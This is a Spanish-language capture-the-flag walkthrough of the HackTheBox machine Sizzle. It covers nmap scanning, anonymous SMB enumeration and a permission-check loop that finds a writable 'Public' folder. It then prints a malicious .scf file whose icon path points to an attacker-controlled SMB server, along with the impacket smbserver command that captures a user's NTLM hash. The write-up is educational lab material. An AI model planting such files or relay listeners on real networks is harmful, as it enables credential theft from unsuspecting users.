# Sizzle-HTB
## Máquina Sizzle de HackTheBox

### Escaneo inicial con nmap

    └─# nmap -p- -sS --open --min-rate 5000 -n -Pn 10.10.10.103 -oG mapscan
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-04 17:56 CEST
    Nmap scan report for 10.10.10.103
    Host is up (0.043s latency).
    Not shown: 65506 filtered tcp ports (no-response)
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT      STATE SERVICE
    21/tcp    open  ftp
    53/tcp    open  domain
    80/tcp    open  http
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    389/tcp   open  ldap
    443/tcp   open  https
    445/tcp   open  microsoft-ds
    464/tcp   open  kpasswd5
    593/tcp   open  http-rpc-epmap
    636/tcp   open  ldapssl
    3268/tcp  open  globalcatLDAP
    3269/tcp  open  globalcatLDAPssl
    5985/tcp  open  wsman
    5986/tcp  open  wsmans
    9389/tcp  open  adws
    47001/tcp open  winrm
              
    Nmap done: 1 IP address (1 host up) scanned in 39.66 seconds

### Escaneo de servicios y scripts por defecto:

    └─# nmap -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001 -sCV 10.10.10.103 -oN portscan                                         
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-04 18:11 CEST
    Nmap scan report for 10.10.10.103
    Host is up (0.043s latency).
    
    PORT      STATE SERVICE       VERSION
    21/tcp    open  ftp           Microsoft ftpd
    |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | ftp-syst: 
    |_  SYST: Windows_NT
    53/tcp    open  domain        Simple DNS Plus
    80/tcp    open  http          Microsoft IIS httpd 10.0
    |_http-server-header: Microsoft-IIS/10.0
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: Site doesn't have a title (text/html).
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
    |_ssl-date: 2023-10-04T16:13:11+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
    | tls-alpn: 
    |   h2
    |_  http/1.1
    |_http-server-header: Microsoft-IIS/10.0
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_ssl-date: 2023-10-04T16:13:12+00:00; +1s from scanner time.
    |_http-title: Site doesn't have a title (text/html).
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    |_ssl-date: 2023-10-04T16:13:12+00:00; +1s from scanner time.
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
    |_ssl-date: 2023-10-04T16:13:11+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    3269/tcp  open  ssl/ldap
    |_ssl-date: 2023-10-04T16:13:11+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=sizzle.htb.local
    | Not valid before: 2018-07-03T17:58:55
    |_Not valid after:  2020-07-02T17:58:55
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    | tls-alpn: 
    |   h2
    |_  http/1.1
    |_ssl-date: 2023-10-04T16:13:11+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
    | Not valid before: 2018-07-02T20:26:23
    |_Not valid after:  2019-07-02T20:26:23
    |_http-server-header: Microsoft-HTTPAPI/2.0
    9389/tcp  open  mc-nmf        .NET Message Framing
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    | smb2-security-mode: 
    |   311: 
    |_    Message signing enabled and required
    | smb2-time: 
    |   date: 2023-10-04T16:12:32
    |_  start_date: 2023-10-04T15:51:02
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 108.08 seconds

### Puerto 445 - SMB

Utilizando smbmap, con un nombre de usuario cualquiera para entrar como invitado - ya que a veces quizás nos dé error si entramos sin usuario - vemos una carpeta compartida interesante llamada 'Department Shares'

    smbmap -H 10.10.10.103 -u "ssa"

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/f391c096-9071-42d3-b257-3abae8893f9c)

Siguiendo con la enumeración, y listando la carpeta 'Users' dentro de 'Department Shares', podemos ver una lista de usuarios, que puede venirnos bien para el futuro:

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/1f98ebfb-84c5-497a-bd5c-5d9fde3950a8)

Aprovechamos que tenemos acceso con usuario anónimo (null session) sobre 'Department Shares/Users', podemos enumerar para comprobar si tenemos permisos de escritura en alguna carpeta dentro de 'Users'. Para ello, vamos a utilizar los siguientes comandos.

Primero, montamos el compartido en nuestro local para movernos más fácilmente a través de él:

    mkdir /mnt/montura
    mount -t cifs "//10.10.10.103/Department Shares" /mnt/montura

Accedemos a él y listamos:

    └─# ls -lrth
    total 0
    drwxr-xr-x 2 root root 0 jul  2  2018 bill
    drwxr-xr-x 2 root root 0 jul  2  2018 bob
    drwxr-xr-x 2 root root 0 jul  2  2018 joe
    drwxr-xr-x 2 root root 0 jul  2  2018 henry
    drwxr-xr-x 2 root root 0 jul  2  2018 amanda
    drwxr-xr-x 2 root root 0 jul  2  2018 morgan
    drwxr-xr-x 2 root root 0 jul  2  2018 jose
    drwxr-xr-x 2 root root 0 jul  2  2018 amanda_adm
    drwxr-xr-x 2 root root 0 jul  2  2018 chris
    drwxr-xr-x 2 root root 0 jul  2  2018 mrb3n
    drwxr-xr-x 2 root root 0 jul 10  2018 lkys37en
    drwxr-xr-x 2 root root 0 oct  4 19:09 Public

Comprobamos por ejemplo el de la usuaria 'amanda' utilizando smbcacls:

    smbcacls "//10.10.10.103/Department Shares" Users/amanda -N
        REVISION:1
        CONTROL:SR|DI|DP
        OWNER:BUILTIN\Administrators
        GROUP:HTB\Domain Users
        ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
        ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
        ACL:Everyone:ALLOWED/OI|CI|I/READ
        ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL

Tenemos que fijarnos en 'Everyone', que en este caso tienen el permiso 'READ'. Vamos a comprobar todos los demás directorios automáticamente:

    for directory in $(ls); do echo -e "\n ${GREEN} [+] Comprobando permisos para el directorio $directory:\n"; echo -e "\t$(smbcacls "//10.10.10.103/Department Shares" Users/$directory -N | grep "Everyone")";done

El directorio 'Public' tiene permisos 'FULL' para 'Everyone':

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/21777aa2-f1e4-4534-8bcc-3819f5d3e3ec)

Esto significa que podemos escribir, crear nuevos archivos en este directorio. Sabiendo que es una carpeta compartida, podemos crear un .scf malicioso para intentar conseguir algún hash.

    └─# cat click.scf 
    [Shell]
    Command=2
    IconFile=\\10.10.14.18\smbfolder\pentestlab.ico
    [Taskbar]
    Command=ToggleDesktop

Creamos el archivo y por otro lado nos ponemos en escucha con, por ejemplo, smbserver.py (También podriamos hacerlo con 'responder', quitando 'smbfolder' del parámetro 'IconFile'.

    /opt/impacket/examples/smbserver.py smbfolder $(pwd) -smb2support

Recibimos el hash de la usuaria 'amanda':

![image](https://github.com/loqasto/Sizzle-HTB/assets/111526713/86e4e78c-3fa0-4027-9ccb-4eb7e6a18079)


